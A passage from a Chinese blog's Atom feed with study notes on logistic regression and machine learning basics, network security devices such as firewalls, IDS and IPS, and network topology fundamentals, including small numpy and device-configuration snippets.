    <summary type="html">&lt;h2 id=&quot;正则化&quot;&gt;&lt;a href=&quot;#正则化&quot; class=&quot;headerlink&quot; title=&quot;正则化&quot;&gt;&lt;/a&gt;正则化&lt;/h2&gt;&lt;p&gt;在机器学习模型中，正则化通过在模型的损失函数中添加一个正则项来实现。这些惩罚项通常会限制模型的复杂度，使模型更加简单，从而更好地泛化</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 逻辑回归</title>
    <link href="https://myprefer.github.io/post/ML-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92.html"/>
    <id>https://myprefer.github.io/post/ML-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92.html</id>
    <published>2024-08-02T13:24:59.000Z</published>
    <updated>2024-08-12T02:37:53.081Z</updated>
    
    <content type="html"><![CDATA[<h2 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h2><p>逻辑回归用来解决<strong>分类</strong>问题, 如样本标签值为0或1, 则线性回归输出的值不太符合实际, 有较大的误差</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408022202719.png"></p><p>对上述数据使用逻辑回归模型(这里使用了sigmoid函数), 可以得到更加精确的结果<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408022222661.png"></p><h3 id="决策边界"><a href="#决策边界" class="headerlink" title="决策边界"></a>决策边界</h3><p>在分类问题中, 把不同类别的数据点分开的界限</p><p>例如<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408022247517.png"></p><p>视情况而定, 决策边界可以是一条直线, 也可以是更加复杂的曲线</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408022249453.png"></p><h3 id="逻辑回归中的代价函数"><a href="#逻辑回归中的代价函数" class="headerlink" title="逻辑回归中的代价函数"></a>逻辑回归中的代价函数</h3><p>逻辑回归中, 代价函数不是凹函数, 在梯度下降中, 有多个局部最小值, 因此不能使用梯度下降的方法求解全局最小值</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408022310976.png"></p><h4 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h4><ul><li>损失函数(loss function)是在一个训练样本的表现</li><li>把所有训练样本的损失加起来得到的代价函数(cost function)才能衡量模型在整个训练集上的表现</li></ul><p> 逻辑回归中的损失函数<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031024723.png"></p><p>简化后损失函数</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031103882.png"></p><p>代价函数为</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031104772.png"></p><h3 id="逻辑回归中的梯度下降"><a href="#逻辑回归中的梯度下降" class="headerlink" title="逻辑回归中的梯度下降"></a>逻辑回归中的梯度下降</h3><p>梯度下降公式</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031123422.png"></p><p>推导得出逻辑回归的梯度下降公式与线性回归的几乎一模一样, 但是他们本质是不同的, 因为函数f是不同的</p><h3 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h3><ul><li><p>差拟合 : 无法很好的适应训练集, 会有较大的误差</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031145373.png"></p></li><li><p>泛化 : 指一个假设模型应用到新样本的能力, 我们追求泛化能力好的模型</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031145437.png"></p></li><li><p>过拟合 : 模型过于强调拟合原始数据, 这样导致丢失了预测新数据的算法本质。对于原始数据, 该模型表现的非常好, 但是对于一个新数据, 其表现很可能会很差<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031146526.png"></p></li></ul><h4 id="解决过拟合问题"><a href="#解决过拟合问题" class="headerlink" title="解决过拟合问题"></a>解决过拟合问题</h4><ul><li><p>获取更多训练数据</p></li><li><p>舍弃部分不能帮助我们正确预测的特征(可能导致有用的特征被丢弃)</p></li><li><p>正则化: 保留原有特征, 减小参数大小</p></li></ul><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;逻辑回归&quot;&gt;&lt;a href=&quot;#逻辑回归&quot; class=&quot;headerlink&quot; title=&quot;逻辑回归&quot;&gt;&lt;/a&gt;逻辑回归&lt;/h2&gt;&lt;p&gt;逻辑回归用来解决&lt;strong&gt;分类&lt;/strong&gt;问题, 如样本标签值为0或1, 则线性回归输出的值不太符合实际, 有较</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 基本概念</title>
    <link href="https://myprefer.github.io/post/ML-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html"/>
    <id>https://myprefer.github.io/post/ML-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html</id>
    <published>2024-07-30T08:58:33.000Z</published>
    <updated>2024-08-12T14:05:55.713Z</updated>
    
    <content type="html"><![CDATA[<h2 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h2><p>监督学习是已经知道数据的label</p><p>即</p><pre><code>Learns from being given &#39;right answers&#39;.</code></pre><p>从正确答案中学习</p><ul><li>例如预测房价问题，给出了房子的面积和价格</li><li>例如过滤垃圾邮件, 训练时给出了邮件和它是否是垃圾</li><li>例如图像目标检测</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301705403.png"></p><p><strong>回归问题</strong>是预测连续值的输出，例如预测房价</p><ul><li>从无限多可能的输出数字中预测数字</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301706669.png"></p><p><strong>分类问题</strong>是预测离散值输出，例如判断肿瘤是良性还是恶性, 判断是猫还是狗</p><ul><li>从一小部分的可能的输出中预测类别</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301718739.png"></p><ul><li><p>输入通常有多个</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301721495.png"></p></li></ul><h2 id="无监督学习"><a href="#无监督学习" class="headerlink" title="无监督学习"></a>无监督学习</h2><p>无监督学习是<strong>不知道</strong>数据具体的含义，比如给定一些数据但不知道它们具体的信息，对于分类问题无监督学习可以得到多个不同的<strong>聚类</strong>，从而实现预测的功能。</p><p>即</p><pre><code>Find something interesting in unlabeled data.</code></pre><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301734439.png"></p><p><strong>聚类</strong> Group similar data points together.</p><ul><li>例如google news对新闻的聚类, 实现相关文章&#x2F;新闻推荐</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301736818.png"></p><ul><li>例如DNA的分析</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301738533.png"></p><ul><li>例如用户集群的划分</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301740853.png"></p><p><strong>其他类型</strong></p><ul><li><strong>异常检测</strong></li><li><strong>降维</strong></li></ul><h2 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h2><p>(线性)回归模型是一种特殊的监督学习模型</p><p>线性回归是拟合一条线，将训练数据尽可能分布到线上。</p><p>有多变量的线性回归称为多元线性回归。</p><p>下图为单变量线性回归模型</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407311629652.png"></p><h2 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h2><p>即cost function, 衡量模型预测的值与真实目标值的差异, 用来评估参数的好坏, 模型会尝试找到最优的参数, 使cost尽可能小</p><ul><li><p>例如, 用方差表示:</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407311717251.png"></p></li><li><p>视觉上为预测值与真实值的高度差<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407311753360.png"></p></li></ul><h2 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h2><p>一种尝试最小化代价函数的算法</p><ul><li><p>首先为每个参数赋一个初值, 根据代价函数的梯度, 一步一步调整参数, 得到最优解</p></li><li><p>初值的不同可能会导致得到的最优解不同, 图中可能会导致两个截然不同的最优解<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408011830505.png"></p></li></ul><p>梯度下降算法  a : 学习率, J: 代价函数</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407312122596.png"></p><h2 id="学习率"><a href="#学习率" class="headerlink" title="学习率"></a>学习率</h2><p>alpha表示学习率, 即每次更新的步长</p><ul><li>若学习率太小, 则每次的步太短, 则需要很多步才能达到最低, 效率太低<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408011826014.png"></li><li>若学习率太大, 则最后可能不收敛, 甚至可能发散<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408011827170.png"></li></ul><h2 id="多维特征"><a href="#多维特征" class="headerlink" title="多维特征"></a>多维特征</h2><p>通常, 问题都会涉及到多个变量，例如房屋价格预测就包括，面积、房间个数、楼层、价格等</p><p>因此, 模型就要包含多个变量, </p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408012139319.png"></p><p>也可写成向量形式</p><p><img src="C:\Users\Myprefer\AppData\Roaming\Typora\typora-user-images\image-20240801215148717.png" alt="image-20240801215148717"></p><h2 id="矢量化"><a href="#矢量化" class="headerlink" title="矢量化"></a>矢量化</h2><p>使用python库<code>numpy</code>可以方便的进行矢量化操作, 可以使代码运行速度大大提高</p><p>例如</p><pre><code class="python">w = np.array([1.0, 2.5, -3])b = 4x = np.array([10, 20, 30])</code></pre><p>模型可简化为</p><pre><code class="python">f = np.dot(w, x) + b</code></pre><p>效果相当于</p><pre><code class="python">f = w[0] * x[0] +    w[1] * x[1] +    w[2] * x[2] + b</code></pre><p>相比与非矢量的方法, 矢量化可以并行计算, 提高效率</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408012200148.png"></p><h2 id="特征缩放"><a href="#特征缩放" class="headerlink" title="特征缩放"></a>特征缩放</h2><p>通常, 多个变量的大小的范围不同, 可以将所有的特征变量缩放到大致相同的范围, 这样可以通常减少梯度算法的迭代步数</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408021808812.png"></p><p>图中, 将数据范围分别为(0, 5)和(300, 2000)的数据缩放到了(0, 1)</p><p>特征缩放不一定非要落到[-1，1]之间，只要数据足够接近就可以。如[0, 3]和[-2. 0.5]等等</p><p>效果演示代码:</p><pre><code class="python">import numpy as npimport matplotlib.pyplot as pltfrom sklearn.preprocessing import MinMaxScaler, StandardScalernp.random.seed(0)x1 = np.random.normal(100, 20, 100)x2 = np.random.normal(50, 10, 100)x3 = np.random.normal(200, 50, 100)data = np.column_stack((x1, x2, x3))plt.figure(figsize=(12, 6))plt.subplot(1, 2, 1)plt.scatter(data[:, 0], data[:, 1], c=data[:, 2], cmap=&#39;viridis&#39;)plt.title(&#39;Original Data&#39;)plt.xlabel(&#39;Feature 1&#39;)plt.ylabel(&#39;Feature 2&#39;)scaler = MinMaxScaler()data_normalized = scaler.fit_transform(data)plt.subplot(1, 2, 2)plt.scatter(data_normalized[:, 0], data_normalized[:, 1], c=data_normalized[:, 2], cmap=&#39;viridis&#39;)plt.title(&#39;Normalized Data&#39;)plt.xlabel(&#39;Feature 1&#39;)plt.ylabel(&#39;Feature 2&#39;)plt.show()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;监督学习&quot;&gt;&lt;a href=&quot;#监督学习&quot; class=&quot;headerlink&quot; title=&quot;监督学习&quot;&gt;&lt;/a&gt;监督学习&lt;/h2&gt;&lt;p&gt;监督学习是已经知道数据的label&lt;/p&gt;
&lt;p&gt;即&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Learns from being gi</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>网络安全设备相关知识</title>
    <link href="https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86.html"/>
    <id>https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86.html</id>
    <published>2024-06-13T07:40:52.000Z</published>
    <updated>2024-06-14T03:54:34.075Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络安全设备"><a href="#网络安全设备" class="headerlink" title="网络安全设备"></a>网络安全设备</h2><p><a href="https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86">网络安全设备相关知识 | Myprefer’s Blog</a></p><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul><li><strong>控制</strong>: 对进出数据进行限制(包过滤, 如ACL)</li><li><strong>管理</strong>: 网络隔离, 进行安全防护(NAT)</li><li><strong>记录</strong>: 对进出数据进行检查, 记录相关信息</li></ul><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ul><li><p>在网络协议栈的各个层次上实施网络访问控制机制</p><ul><li>网络层: 包过滤</li><li>传输层: 电路级代理</li><li>应用层: 应用层代理&#x2F;网关</li></ul></li><li><p>控制网络域间传送的数据流</p><ul><li>检查网络流量</li><li>防止脆弱或不安全的协议和服务</li><li>防止内部网络信息外泄</li><li>对网络存取和访问进行监控和审计</li><li>强化网络安全策略, 集成网络安全防御机制</li></ul></li></ul><h4 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h4><ul><li>无法防范内部的安全威胁(防外不防内</li><li>不能防范病毒</li><li>不能防范针对开放服务安全漏洞的渗透攻击</li><li>不能防范针对网络客户端程序的渗透攻击</li><li>不能防范基于隐蔽通道的特洛伊木马或僵尸网络</li></ul><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ul><li>按形态: 硬件&#x2F;软件</li><li>按技术: 包过滤(透明模式, 连交换机)&#x2F;代理(可作路由 ,NAT, ACL)</li></ul><h4 id="实现技术"><a href="#实现技术" class="headerlink" title="实现技术"></a>实现技术</h4><h5 id="包过滤"><a href="#包过滤" class="headerlink" title="包过滤"></a>包过滤</h5><ul><li>实现机制: 依据数据包的级别<strong>标记</strong>来控制数据包 </li><li>优点:<ul><li>只分析数据包的IP, TCP&#x2F;UDP协议和端口, 速度快</li><li>易于配置</li><li>对用户透明, 不需要提供额外的密码等</li></ul></li><li>缺点:<ul><li>只在网络层, 不能识别应用层协议或维持连接状态</li><li>安全性薄弱, 不能防止IP欺骗</li><li>难正确制订规则</li><li>不能引入认证机制</li></ul></li></ul><h5 id="代理网关"><a href="#代理网关" class="headerlink" title="代理网关"></a>代理网关</h5><ul><li>每一个内外网络之间的连接都要通过防火墙的介入和转换加强了控制</li><li>不同层面的代理技术:<ul><li>应用层: 应用层代理(HTTP代理)</li><li>传输层: 电路级代理(Socks代理)</li><li>网络层: NAT代理(NAT网关, 拨号上网路由器)</li></ul></li></ul><h5 id="代理-proxy-技术"><a href="#代理-proxy-技术" class="headerlink" title="代理(proxy)技术"></a>代理(proxy)技术</h5><ul><li>运行客户端通过代理与网络服务进行非直接的连接</li><li>在代理服务器上可以进行服务控制和内容检查</li></ul><h6 id="应用层代理"><a href="#应用层代理" class="headerlink" title="应用层代理"></a>应用层代理</h6><ul><li>也称应用层网关, 代理服务器</li><li>代理HTTP, Email等应用层服务</li></ul><h6 id="电路级代理"><a href="#电路级代理" class="headerlink" title="电路级代理"></a>电路级代理</h6><ul><li>在传输层</li><li>同时位多种不同的应用服务提供支持</li></ul><h5 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h5><ul><li>将私有地址转化为合法地址</li><li>允许多个用户分享少量或单一的IP地址(源IP)</li><li>允许将网络服务映射到内部服务网络IP和端口(目的NAT)</li></ul><h5 id="状态检测"><a href="#状态检测" class="headerlink" title="状态检测"></a>状态检测</h5><ul><li>在数据链路层和网络层之间对数据包进行检测</li><li>创建状态表用于维护连接上下文</li><li>特点: 安全性高, 性能高, 适应性好, 对用户和应用程序透明</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141017052.png"></p><h4 id="部署方式"><a href="#部署方式" class="headerlink" title="部署方式"></a>部署方式</h4><h5 id="路由模式"><a href="#路由模式" class="headerlink" title="路由模式"></a>路由模式</h5><ol><li>配置接口互联地址。（配置ip）</li><li>配置路由，使地址路由可达。</li><li>配置源NAT使内网服务器可以访问公网。</li><li>放行对应的防火墙策略。</li></ol><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141034988.png"></p><p>当防火墙位于内部网络和外部网络之间时，需要将防火墙与内部网络、外部网络以及DMZ 三个区域相连的接口分别配置成不同网段的IP 地址，重新规划原有的网络拓扑，此时相当于一台<strong>路由器</strong>。</p><h5 id="透明模式"><a href="#透明模式" class="headerlink" title="透明模式"></a>透明模式</h5><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141036802.png"></p><p>如果防火墙采用透明模式进行工作，则可以避免改变拓扑结构造成的麻烦，此时防火墙对于子网用户和路由器来说是完全透明的。也就是说，用户完全感觉不到防火墙的存在。</p><h5 id="混合模式"><a href="#混合模式" class="headerlink" title="混合模式"></a>混合模式</h5><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141037016.png"></p><p>如果防火墙既存在工作在路由模式的接口（接口具有IP 地址），又存在工作在透明模式的接口（接口无IP 地址），则防火墙工作在混合模式下。</p><h4 id="部署方法"><a href="#部署方法" class="headerlink" title="部署方法"></a>部署方法</h4><h5 id="包过滤路由器"><a href="#包过滤路由器" class="headerlink" title="包过滤路由器"></a>包过滤路由器</h5><p><img src="C:\Users\Myprefer\AppData\Roaming\Typora\typora-user-images\image-20240614104619194.png" alt="image-20240614104619194"></p><ul><li><strong>优势</strong>: 成本低, 易用</li><li><strong>缺点</strong>:<ul><li>一旦路由器被攻破, 内网完全暴露</li><li>内部网络信息对外公开, 可攻击开放的主机和服务</li></ul></li></ul><h5 id="双宿主堡垒主机"><a href="#双宿主堡垒主机" class="headerlink" title="双宿主堡垒主机"></a>双宿主堡垒主机</h5><blockquote><p>堡垒主机(Bastion Host): 对外部网络暴露, 同时也是内部网络用户的主要连接点</p><p>双宿主主机(Dual-homed Host): 至少有两个网络接口的通用计算机系统</p></blockquote><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141049303.png"></p><ul><li>使用应用代理网关作为双宿主堡垒主机<ul><li>一个使用公网IP地址连接外部网络</li><li>一个使用私有IP地址连接内部网络</li><li>由应用代理服务器程序为特定的网络应用提供代理</li></ul></li><li>优点: 对外屏蔽内网信息, 用户身份认证和行为审计</li><li>缺点:<ul><li>内网对外访问控制过于严格</li><li>堡垒主机安全性差</li><li>一旦堡垒主机被攻破, 内网也将全面暴露</li></ul></li></ul><h5 id="屏蔽主机"><a href="#屏蔽主机" class="headerlink" title="屏蔽主机"></a>屏蔽主机</h5><h5 id="屏蔽子网"><a href="#屏蔽子网" class="headerlink" title="屏蔽子网"></a>屏蔽子网</h5><blockquote><p>DMZ(Demilitarized Zone, 非军事区或停火区): 在内部网络和外部网络之间增加的一个子网</p></blockquote><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141113256.png"></p><ul><li>三层防护: 外网防火墙, 应用层代理, 内网防火墙</li></ul><h4 id="策略设置"><a href="#策略设置" class="headerlink" title="策略设置"></a>策略设置</h4><ul><li>没有明确允许的就是禁止<ul><li>先阻止所有数据包</li><li>放行允许的</li></ul></li></ul><h3 id="入侵检测系统-IDS"><a href="#入侵检测系统-IDS" class="headerlink" title="入侵检测系统(IDS)"></a>入侵检测系统(IDS)</h3><p>入侵检测系统是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取<strong>主动</strong>反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于，IDS是一种积极主动的安全防护技术。</p><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><ul><li>防火墙的重要补充</li><li>构建网络安全防御体系重要环节</li><li>克服传统防御机制的限制</li></ul><h4 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h4><ul><li>监测分析用户和系统的活动</li><li>核查系统配置和漏洞</li><li>日志管理, 识别异常活动</li><li>针对攻击行为作出反应</li></ul><h4 id="技术架构"><a href="#技术架构" class="headerlink" title="技术架构"></a>技术架构</h4><ul><li>事件产生器</li><li>事件分析器</li><li>响应单元</li><li>事件数据库</li></ul><h4 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h4><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141130084.png"></p><h4 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h4><ul><li>基于网络的入侵检测系统(<strong>NIDS</strong>)<ul><li>IDS可以放在防火墙或网关的后面, 以网络嗅探器的形式捕获所有的对内对外的数据包</li></ul></li><li>基于主机的入侵检测系统(<strong>HIDS</strong>)<ul><li>安全操作系统必须有一定的审计功能, 并记录相应的安全性内核</li></ul></li><li>分布式入侵检测系统(<strong>DIDS</strong>)</li></ul><h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><ul><li>使用复杂</li><li>现有技术难以满足实际性能需要</li><li>高虚警率, 用户处理的负担重</li><li>许多警告信息难以与入侵行为相关联</li><li>对其他数据的检测可能会受影响</li></ul><h3 id="安全隔离与信息交换系统-网闸"><a href="#安全隔离与信息交换系统-网闸" class="headerlink" title="安全隔离与信息交换系统(网闸)"></a>安全隔离与信息交换系统(网闸)</h3><h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h4><ul><li>外部处理单元</li><li>内部处理单元</li><li>仲裁处理单元</li></ul><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul><li>断开内外网之间的会话(物理隔离, 协议隔离)</li><li>集成了其他安全技术</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141142951.png"></p><h3 id="入侵防御系统-IPS"><a href="#入侵防御系统-IPS" class="headerlink" title="入侵防御系统(IPS)"></a>入侵防御系统(IPS)</h3><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141143640.png"></p><h4 id="IDS与IPS"><a href="#IDS与IPS" class="headerlink" title="IDS与IPS"></a>IDS与IPS</h4><ul><li>IDS: 旁路监听, 只起到检测作用</li><li>IPS: 内联模式, 实时处置数据包</li></ul><h3 id="统一威胁管理系统-UTM"><a href="#统一威胁管理系统-UTM" class="headerlink" title="统一威胁管理系统(UTM)"></a>统一威胁管理系统(UTM)</h3><ul><li>防火墙 + IDS + IPS + 防毒墙</li></ul><h3 id="网络架构安全设计"><a href="#网络架构安全设计" class="headerlink" title="网络架构安全设计"></a>网络架构安全设计</h3><ul><li>合理划分网络安全区域</li><li>规划网络IP地址, vlan设计</li><li>安全配置路由交换设备</li><li>网络边界访问控制</li><li>网络冗余配置(HSRP\vrrp冗余技术), 负载均衡<ul><li>防止单点故障</li><li>提供网络健全性, 安全性</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;网络安全设备&quot;&gt;&lt;a href=&quot;#网络安全设备&quot; class=&quot;headerlink&quot; title=&quot;网络安全设备&quot;&gt;&lt;/a&gt;网络安全设备&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://myprefer.github.io/post/%E7%BD%91%E7%</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>网络拓扑基础</title>
    <link href="https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9F%BA%E7%A1%80.html"/>
    <id>https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9F%BA%E7%A1%80.html</id>
    <published>2024-06-10T08:02:31.000Z</published>
    <updated>2024-06-14T05:52:24.026Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9F%BA%E7%A1%80">网络拓扑基础 | Myprefer’s Blog</a></p><h2 id="网络基础概念"><a href="#网络基础概念" class="headerlink" title="网络基础概念"></a>网络基础概念</h2><h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h3><ul><li>IP地址在网络中用于标识一个节点(或者网络设备的接口)</li><li>IP地址用于IP报文在网络中的寻址</li></ul><p><em>IP地址就像现实中的地址, 可以标识网络中的一个节点, 数据就是通过它来找到目的地</em></p><h4 id="IP地址格式"><a href="#IP地址格式" class="headerlink" title="IP地址格式"></a>IP地址格式</h4><p><strong>192.168.1</strong>.1</p><p>网络位(192.168.1) + 主机位</p><p>由<strong>子网掩码</strong>决定网络位长度</p><ul><li><strong>192.168.1</strong>.1 — <strong>255.255.255</strong>.0(掩码)</li><li><strong>192.168</strong>.1.1 — <strong>255.255</strong>.0.0(掩码)</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406101743973.png"></p><h4 id="配置IP地址"><a href="#配置IP地址" class="headerlink" title="配置IP地址"></a>配置IP地址</h4><pre><code class="shell">interface &lt;接口&gt;ip address 192.168.1.1 255.255.255.0</code></pre><h4 id="Dhcp"><a href="#Dhcp" class="headerlink" title="Dhcp"></a>Dhcp</h4><ul><li>作用: 自动给电脑&#x2F;手机配置IP地址</li></ul><h3 id="DNS域名系统"><a href="#DNS域名系统" class="headerlink" title="DNS域名系统"></a>DNS域名系统</h3><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406101830542.png"></p><h3 id="路由技术基础"><a href="#路由技术基础" class="headerlink" title="路由技术基础"></a>路由技术基础</h3><h4 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h4><p><strong>不同网段</strong>之间的通信需要经过网关</p><h4 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h4><p>路由器的转发原理是通过路由表来判断数据包从哪个接口发出, 实现数据包的转发</p><ul><li>显示路由表: <code>dis ip routing-table  &lt;ip&gt;</code></li></ul><h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><ul><li>可靠性高, 三次握手</li><li>延迟高</li></ul><p>适合对文件传输的完整性高, 对延迟不敏感的服务</p><h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><ul><li>速度快</li><li>不可靠</li></ul><p>适用于网络游戏, 视频通话等</p><h4 id="交换机的接口模式"><a href="#交换机的接口模式" class="headerlink" title="交换机的接口模式"></a>交换机的接口模式</h4><ul><li>Access: 用来连接终端, 电脑, 打印机</li><li>Trunk: 用来连接其他交换机</li></ul><h3 id="Vlan虚拟局域网"><a href="#Vlan虚拟局域网" class="headerlink" title="Vlan虚拟局域网"></a>Vlan虚拟局域网</h3><ul><li><p>安全, 隔离<br>vlan-10中的设备可以ping通</p><p>vlan-10与vlan-20中的设备不能ping通</p></li></ul><p>识别数据包属于哪个vlan:</p><ul><li>交换机进行数据包标记, 通过标签判断</li></ul><h3 id="ACL访问控制列表"><a href="#ACL访问控制列表" class="headerlink" title="ACL访问控制列表"></a>ACL访问控制列表</h3><p>根据预先定义好的规则对流量进行<strong>筛选</strong>和<strong>过滤</strong></p><h5 id="ACL的类型"><a href="#ACL的类型" class="headerlink" title="ACL的类型"></a>ACL的类型</h5><ul><li><strong>标准访问控制列表</strong>: 只能基于源ip地址进行过滤</li><li><strong>扩展访问控制列表</strong>: 可以根据源、目IP，TCP&#x2F;UDP协议，源、目端口号进行过滤</li></ul><h3 id="NAT网络地址转换"><a href="#NAT网络地址转换" class="headerlink" title="NAT网络地址转换"></a>NAT网络地址转换</h3><p>用于实现私有网络和公有网络之间的互访                                                                                                   </p><ul><li>NAT外部的主机无法主动跟位于NAT内部的主机通信，NAT内部2主机想要通信，必须主动和公网的一个IP通信，路由器负责建立一个<strong>映射关系</strong>，从而实现数据的转发。</li></ul><h5 id="静态NAT"><a href="#静态NAT" class="headerlink" title="静态NAT"></a>静态NAT</h5><ul><li>静态NAT实现私网地址和公网地址的一对一转换。(服务器公网IP)</li></ul><h3 id="远程管理网络设备"><a href="#远程管理网络设备" class="headerlink" title="远程管理网络设备"></a>远程管理网络设备</h3><ul><li>telnet:<pre><code class="sh">telnet &lt;IP&gt; &lt;PORT&gt;</code></pre></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9F%BA%E7%A1%80&quot;&gt;网络拓扑基础 | Myprefer’s Blog&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内网安全-网络知识</title>
    <link href="https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86.html"/>
    <id>https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86.html</id>
    <published>2024-06-01T03:11:57.000Z</published>
    <updated>2024-06-14T05:53:47.627Z</updated>
    
